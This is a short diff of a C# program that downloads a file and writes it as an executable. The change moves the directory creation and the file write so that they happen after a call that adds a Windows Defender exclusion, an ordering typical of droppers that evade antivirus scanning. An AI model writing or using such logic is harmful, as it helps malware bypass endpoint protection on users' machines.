@@ -368,7 +368,6 @@ class Program
     {
         try
         {
-            Directory.CreateDirectory(INSTALL_PATH);
 
             var newBytes = await DownloadFileAsync();
             if (newBytes == null)
@@ -393,8 +392,10 @@ class Program
                 }
             }
 
-            await File.WriteAllBytesAsync(EXE_PATH, newBytes);
             await AddWindowsDefenderExclusion();
+            Directory.CreateDirectory(INSTALL_PATH);
+            await File.WriteAllBytesAsync(EXE_PATH, newBytes);
+            
         }
         catch (Exception ex)
         {
